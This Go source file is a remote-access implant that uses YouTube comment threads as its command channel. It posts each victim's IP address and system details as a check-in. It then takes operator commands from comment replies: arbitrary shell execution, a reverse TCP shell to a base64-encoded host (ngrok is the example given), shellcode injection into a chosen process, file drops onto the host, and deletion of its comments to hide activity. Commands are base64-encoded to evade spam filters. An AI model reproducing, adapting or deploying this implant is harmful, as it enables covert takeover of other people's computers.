package main

///

/// https://developers.google.com/youtube/v3/quickstart/go <--- pretty much using oauth guide here but embedded the json files after inital login so i never have to do that again

///

// GOOS=windows GOARCH=amd64 go build -buildmode=pie -ldflags "-s -w" .
import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	_ "embed"

	"github.com/google/uuid"
	"golang.org/x/oauth2"
	"golang.org/x/oauth2/google"
	"google.golang.org/api/youtube/v3"
)

const implantChannelId string = ""  // current OAuth Clients channel if using channel discussion tab to communicate
const videoId string = ""           // Video if using video to communicate
const operatorChannelId string = "" // operators unique channel id
const MAX_COMMENT_SIZE int = 8000
const MAX_COMMENT_SIZE_FLOAT float64 = 8000

var agentID string

//go:embed secret.json
var secretJson []byte

//go:embed cachedToken.json
var cachedToken []byte

var Tasks map[string]bool

//TokenFromEmbed unmarshal embedded refresh oauth token
func TokenFromEmbed() (*oauth2.Token, error) {
	t := &oauth2.Token{}
	err := json.Unmarshal(cachedToken, t)
	return t, err
}

//GenerateAgentId generate uuid for agent identification
func GenerateAgentId() string {
	uuidWithHypen := uuid.New()
	return strings.Replace(uuidWithHypen.String(), "-", "", -1)
}

//GatherIpAddress gets ip address
func GatherIpAddress() string {
	resp, err := http.Get("https://ipinfo.io/ip")
	if err != nil {
		return "Error Gathering Ip"
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	return string(body)
}

//GenerateJitter
func GenerateJitter(maxSeconds int, minSeconds int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(maxSeconds-minSeconds) + minSeconds
}

//GetClient use token from embed to return a config to create youtube service
func GetClient(ctx context.Context, config *oauth2.Config) *http.Client {
	tok, err := TokenFromEmbed()
	if err != nil {
		log.Fatal(err)
	}
	return config.Client(ctx, tok)
}

//CheckIn create top level comment on oauth token users channels discussion board
func CheckIn(ytService *youtube.Service) (string, error) {
	var part []string
	ip := GatherIpAddress()
	checkInMessage := fmt.Sprintf("::: %s :::\n::: %s %s :::\n::: %s:::\n", agentID, runtime.GOOS, runtime.GOARCH, ip)
	part = append(part, "id")
	part = append(part, "snippet")
	part = append(part, "replies")
	ct := &youtube.CommentThread{}
	ct.Snippet = &youtube.CommentThreadSnippet{}
	ct.Snippet.TopLevelComment = &youtube.Comment{}
	ct.Snippet.TopLevelComment.Snippet = &youtube.CommentSnippet{}
	ct.Snippet.ChannelId = implantChannelId
	//ct.Snippet.VideoId = videoId
	ct.Snippet.TopLevelComment.Snippet.TextOriginal = checkInMessage
	resp, err := ytService.CommentThreads.Insert(part, ct).Do()
	if err != nil {
		return "Failed", err
	}
	return resp.Id, nil
}

func CheckIfTopLevelCommentsReachingMax(ytService *youtube.Service, topLevelCommentIdString string) bool {
	var part []string
	part = append(part, "id")
	part = append(part, "snippet")
	replies, err := ytService.Comments.List(part).ParentId(topLevelCommentIdString).MaxResults(100).Do()
	if err != nil {
		log.Printf("Error checking comments number %v\n", err)
		return false
	}
	if len(replies.Items) > 85 {
		return true
	}
	return false
}

//CheckForCommands list replies to top level comment if the authors channel id matches global variable check if command already exists in hashtab else execute command
func CheckForCommands(ytService *youtube.Service, topLevelCommentIdString string) error {
	var part []string
	part = append(part, "id")
	part = append(part, "snippet")
	replies, err := ytService.Comments.List(part).ParentId(topLevelCommentIdString).MaxResults(100).Do()
	if err != nil {
		return err
	}
	// look through replies and find specific username that can allow command
	for x := range replies.Items {
		//if replies.Items[x].Snippet.AuthorChannelId.Value == operatorChannelId {
		if replies.Items[x].Snippet.AuthorChannelId.Value != implantChannelId {
			id := replies.Items[x].Id
			cmd := replies.Items[x].Snippet.TextOriginal
			author := replies.Items[x].Snippet.AuthorDisplayName
			if _, ok := Tasks[id]; !ok {
				Tasks[id] = false
				log.Printf("New Task submitted by %s ::: %s\n", author, cmd)
				// Splitting cmd to switch statement first arg
				commandParams := strings.Split(cmd, " ")
				// You could add more tasks like take screenshot, process injection migrate process etc
				switch commandParams[0] {
				case "shell":
					//echo -n "4.tcp.ngrok.io" | base64
					targetHost, err := base64.StdEncoding.DecodeString(commandParams[1])
					if err != nil {
						break
					}
					targetHostStr := string(targetHost)
					log.Println(targetHostStr)
					go ReverseTcpShell(targetHostStr, commandParams[2])
					break
				case "migrate":
					if runtime.GOOS == "windows" {
						targetPid := commandParams[1]
						res := Migrate(targetPid)
						if res == nil {
							log.Printf("Migrate Successfully Exiting...")
							return errors.New("Exit")
						}
					}
					break
				case "inject":
					if runtime.GOOS == "windows" {
						targetPid := commandParams[1]
						// Base 64 Encoded to bypass comment spam filters
						// echo -n "https://mypayload/shell.bin"
						shellcodeUrl, err := base64.StdEncoding.DecodeString(commandParams[2])
						if err != nil {
							break
						}
						shellCodeUrlDecoded := string(shellcodeUrl)
						res := ClassicInjection(targetPid, shellCodeUrlDecoded)
						if res == nil {
							SendResult(ytService, fmt.Sprintf("::: PID %s Injection Success :::", targetPid), topLevelCommentIdString)
						} else {
							SendResult(ytService, fmt.Sprintf("::: PID %s Injection Failed :::", targetPid), topLevelCommentIdString)
						}
					}
					break
				case "pid":
					pid := os.Getpid()
					cmdRes := fmt.Sprintf("::: Current Process Pid ::: %d", pid)
					resp, err := SendResult(ytService, cmdRes, topLevelCommentIdString)
					if err != nil {
						log.Printf("%+v\n\n####\n%vn", resp, err)
						errStr := err.Error()
						SendResult(ytService, errStr, topLevelCommentIdString)
					}
					break
				case "user":
					u, err := user.Current()
					if err != nil {
						errStr := err.Error()
						SendResult(ytService, errStr, topLevelCommentIdString)
						break
					}
					userName := u.Username
					basicInfo := fmt.Sprintf("::: %s :::\n", userName)
					SendResult(ytService, basicInfo, topLevelCommentIdString)
					break
				case "upload":
					// run in a go routine so we dont block
					go func() {
						// Base 64 Encoded to bypass comment spam filters
						fileUrl, err := base64.StdEncoding.DecodeString(commandParams[1])
						if err != nil {
							cmdRes := fmt.Sprintf("::: Failed to upload %s :::\n", err.Error())
							SendResult(ytService, cmdRes, topLevelCommentIdString)
							return
						}
						fileUrlDecoded := string(fileUrl)
						outputDir := commandParams[2]
						lenWritten, err := HandleUpload(fileUrlDecoded, outputDir)
						if err != nil {
							cmdRes := fmt.Sprintf("::: Failed to upload %s :::\n", err.Error())
							SendResult(ytService, cmdRes, topLevelCommentIdString)
							return
						}
						cmdRes := fmt.Sprintf("::: Successfully uploaded %d bytes to %s :::\n", lenWritten, outputDir)
						SendResult(ytService, cmdRes, topLevelCommentIdString)
					}()
					break
				case "clear":
					go DeleteAllComments(ytService, topLevelCommentIdString)
					break
				case "exit":
					DeleteAllComments(ytService, topLevelCommentIdString)
					DeleteTopLevelComment(ytService, topLevelCommentIdString)
					return errors.New("Exit")
				default:
					// default case is shell commands run it in a go routine so it doesnt block if its a long running task like a ping
					go func() {
						cmdRes, err := ExecuteCommand(cmd)
						if err != nil {
							log.Println(err)
						}
						resp, err := SendResult(ytService, cmdRes, topLevelCommentIdString)
						if err != nil {
							log.Printf("%+v\n\n####\n%vn", resp, err)
							errStr := err.Error()
							SendResult(ytService, errStr, topLevelCommentIdString)
						}
					}()
					break
				}
				Tasks[id] = true
			}
		}
	}
	return nil
}

//SendResult sends result of execute command as top level comment reply
func SendResult(ytService *youtube.Service, result string, replyId string) (bool, error) {
	/// 8000 MAX COMMENT SIZE
	var part []string
	part = append(part, "snippet")
	if len(result) < MAX_COMMENT_SIZE {
		c := &youtube.Comment{}
		c.Snippet = &youtube.CommentSnippet{}
		c.Snippet.TextOriginal = result
		c.Snippet.ParentId = replyId
		resp, err := ytService.Comments.Insert(part, c).Do()
		if err != nil {
			return false, err
		}
		log.Printf("Sent Result %d\n", resp.HTTPStatusCode)
		return true, nil
	}
	// Result is too big split it into chunks of 8000 bytes and post each comment one by one
	totalChunks := float64(float64(len(result)) / MAX_COMMENT_SIZE_FLOAT)
	totalChunksRounded := int(math.Ceil(totalChunks))
	currentPosition := 0
	// Thought about adding a maximum split size but decided not to
	for x := 1; x < totalChunksRounded+1; x++ {
		chunkStr := fmt.Sprintf("PAGE ::: %d/%d :::\n", x, totalChunksRounded)
		if (MAX_COMMENT_SIZE * x) > len(result) {
			chunkStr += result[currentPosition:]
		} else {
			chunkStr += result[currentPosition : MAX_COMMENT_SIZE*x]
		}
		c := &youtube.Comment{}
		c.Snippet = &youtube.CommentSnippet{}
		c.Snippet.TextOriginal = chunkStr
		c.Snippet.ParentId = replyId
		resp, err := ytService.Comments.Insert(part, c).Do()
		if err != nil {
			log.Printf("Chunk err %+v\n", err)
			return false, err
		}
		log.Printf("Sent Chunk #%d %d\n", x, resp.HTTPStatusCode)
		currentPosition += MAX_COMMENT_SIZE
	}
	log.Printf("Successfully Sent %d Chunks\n", totalChunksRounded)
	return true, nil
}

func DeleteOldComments(ytService *youtube.Service, topLevelCommentIdString string, minutesBeforeDelete int) error {
	// Check for comments posted time subtract from current time.
	// if difference is greater than n minutes delete the comment
	var part []string
	part = append(part, "id")
	part = append(part, "snippet")
	replies, err := ytService.Comments.List(part).ParentId(topLevelCommentIdString).MaxResults(100).Do()
	if err != nil {
		return err
	}
	for x := range replies.Items {
		current := time.Now().UTC()
		publishedTime := replies.Items[x].Snippet.PublishedAt
		res, err := time.Parse(time.RFC3339, publishedTime)
		if err != nil {
			return err
		}
		// delete comment if older than specified mins
		res = res.Add(time.Minute * time.Duration(minutesBeforeDelete))
		if current.After(res) {
			id := replies.Items[x].Id
			err = ytService.Comments.Delete(id).Do()
			if err != nil {
				log.Printf("Error deleting comment%v\n", err)
			} else {
				log.Printf("Deleted comments id %s\n", id)
			}
		}
	}
	return nil
}

func DeleteTopLevelComment(ytService *youtube.Service, topLevelCommentIdString string) error {
	var part []string
	part = append(part, "id")
	part = append(part, "snippet")
	err := ytService.Comments.Delete(topLevelCommentIdString).Do()
	if err != nil {
		return err
	}
	return nil
}

func DeleteAllComments(ytService *youtube.Service, topLevelCommentIdString string) error {
	var part []string
	part = append(part, "id")
	part = append(part, "snippet")
	replies, err := ytService.Comments.List(part).ParentId(topLevelCommentIdString).MaxResults(100).Do()
	if err != nil {
		return err
	}
	for x := range replies.Items {
		id := replies.Items[x].Id
		err = ytService.Comments.Delete(id).Do()
		if err != nil {
			log.Printf("Error deleting comment%v\n", err)
		} else {
			log.Printf("Deleted comments id %s\n", id)
		}
	}
	return nil
}

func HandleUpload(url string, outDir string) (int, error) {
	resp, err := http.Get(url)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	rawFileBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, err
	}
	if err = os.WriteFile(outDir, rawFileBytes, 0666); err != nil {
		return 0, err
	}
	return len(rawFileBytes), nil
}

func main() {
	Tasks = make(map[string]bool)
	agentID = GenerateAgentId()
	ctx := context.Background()
	config, err := google.ConfigFromJSON(secretJson, youtube.YoutubeForceSslScope)
	if err != nil {
		log.Fatal(err)
	}
	//client := GetClientWeb(ctx, config) // <- used for inital setup getting oauth tokens written to disk, need to embed them then use GetClient
	client := GetClient(ctx, config)
	service, err := youtube.New(client)
	if err != nil {
		log.Fatal(err)
	}
	// Check in and save top comment since thats where all commands come from
	topLevelCommentID, err := CheckIn(service)
	if err != nil {
		log.Fatal(err)
	}
	time.Sleep(time.Second * 15)
	//Setup done start loop
	for {
		err := CheckForCommands(service, topLevelCommentID)
		if err != nil {
			if err.Error() == "Exit" {
				// Silently Exit Main
				return
			}
			// try not to crash if error
			log.Println(err)
		}
		time.Sleep(time.Second * time.Duration(GenerateJitter(60, 30)))
		// Check if number of comments is greater than 80 if greater than 80 perform new checkin to create new top level comment thread
		if CheckIfTopLevelCommentsReachingMax(service, topLevelCommentID) {
			topLevelCommentID, err = CheckIn(service)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
}

////////////// Used to get initial tokens and save to disk /////////////////////
/// after you embed them into binary you dont need to auth anymore
/// after embed you can remove all these functions

//GetClient use token from embed to return a config to create youtube service
func GetClientWeb(ctx context.Context, config *oauth2.Config) *http.Client {
	tok := getTokenFromWeb(config)
	cacheFile, err := tokenCacheFile()
	if err != nil {
		log.Fatalf("Unable to get path to cached credential file. %v", err)
	}
	saveToken(cacheFile, tok)
	return config.Client(ctx, tok)
}

func tokenCacheFile() (string, error) {
	usr, err := user.Current()
	if err != nil {
		return "", err
	}
	tokenCacheDir := filepath.Join(usr.HomeDir, ".credentials")
	os.MkdirAll(tokenCacheDir, 0700)
	return filepath.Join(tokenCacheDir,
		url.QueryEscape("cachedToken.json")), err
}

func getTokenFromWeb(config *oauth2.Config) *oauth2.Token {
	authURL := config.AuthCodeURL("state-token", oauth2.AccessTypeOffline)
	fmt.Printf("Go to the following link in your browser then type the "+
		"authorization code: \n%v\n", authURL)

	var code string
	if _, err := fmt.Scan(&code); err != nil {
		log.Fatalf("Unable to read authorization code %v", err)
	}

	tok, err := config.Exchange(oauth2.NoContext, code)
	if err != nil {
		log.Fatalf("Unable to retrieve token from web %v", err)
	}
	return tok
}

func saveToken(file string, token *oauth2.Token) {
	fmt.Printf("Saving credential file to: %s\n", file)
	f, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		log.Fatalf("Unable to cache oauth token: %v", err)
	}
	defer f.Close()
	json.NewEncoder(f).Encode(token)
}
